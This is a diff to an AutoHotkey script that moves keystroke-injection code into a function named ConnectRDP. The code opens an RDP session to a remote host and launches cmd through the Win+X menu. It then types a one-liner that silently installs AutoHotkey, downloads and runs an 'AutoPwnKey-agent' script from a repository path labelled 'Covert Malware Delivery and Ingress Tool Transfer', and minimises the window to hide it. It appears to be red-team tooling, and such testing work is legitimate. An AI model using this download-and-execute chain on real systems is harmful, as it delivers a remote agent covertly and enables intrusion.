@@ -53,6 +53,27 @@ ConnectRDP(hostname, username, password, domain := "") {
     ; Clean up RDP file after a delay
     SetTimer(() => (FileExist(rdpFile) ? FileDelete(rdpFile) : ""), -5000)
     
+    Sleep(300)
+
+    Send("{Left}{Enter}") 
+
+    ; Wait for and activate the RDP window
+    WinWait("temp - " hostname " - Remote Desktop Connection")
+    WinActivate("temp - " hostname " - Remote Desktop Connection")
+    Sleep(2500)
+    ; Send Windows+X, then r for run
+    Send("#x")
+    Sleep(300)  ; Small delay to ensure menu appears
+    Send("r")
+    Sleep(500)  ; Delay to allow window to open
+    Send("{Backspace}")
+    Send("cmd")
+    Send("{Enter}")
+    Sleep(800) ; Delay to allow window to open
+    Send('{Text}curl -L -o ahk.exe https://github.com/AutoHotkey/AutoHotkey/releases/download/v2.0.19/AutoHotkey_2.0.19_setup.exe && ahk.exe /silent /installto %USERPROFILE%\AppData\Local\Programs\AutoHotkey && timeout 3 && curl -L -o script.ahk https://raw.githubusercontent.com/CroodSolutions/AutoPwnKey/refs/heads/main/1%20-%20Covert%20Malware%20Delivery%20and%20Ingress%20Tool%20Transfer/AutoPwnKey-agent.ahk && timeout 3 && %USERPROFILE%\AppData\Local\Programs\AutoHotkey\v2\AutoHotkey64.exe script.ahk')
+    Send("{Enter}")
+    Sleep(300)
+    Send("#{Down}") ; Minimize cmd
     
     return true
 } 
@@ -65,24 +86,4 @@ password := "Password"
 
 result := ConnectRDP(hostname, username, password)
 
-Sleep(300)
 
-Send("{Left}{Enter}") 
-
-; Wait for and activate the RDP window
-WinWait("temp - " hostname " - Remote Desktop Connection")
-WinActivate("temp - " hostname " - Remote Desktop Connection")
-Sleep(2500)
-; Send Windows+X, then r for run
-Send("#x")
-Sleep(300)  ; Small delay to ensure menu appears
-Send("r")
-Sleep(500)  ; Delay to allow window to open
-Send("{Backspace}")
-Send("cmd")
-Send("{Enter}")
-Sleep(800) ; Delay to allow window to open
-Send('{Text}curl -L -o ahk.exe https://github.com/AutoHotkey/AutoHotkey/releases/download/v2.0.19/AutoHotkey_2.0.19_setup.exe && ahk.exe /silent /installto %USERPROFILE%\AppData\Local\Programs\AutoHotkey && timeout 3 && curl -L -o script.ahk https://raw.githubusercontent.com/CroodSolutions/AutoPwnKey/refs/heads/main/1%20-%20Covert%20Malware%20Delivery%20and%20Ingress%20Tool%20Transfer/AutoPwnKey-agent.ahk && timeout 3 && %USERPROFILE%\AppData\Local\Programs\AutoHotkey\v2\AutoHotkey64.exe script.ahk')
-Send("{Enter}")
-Sleep(300)
-Send("#{Down}") ; Minimize cmd
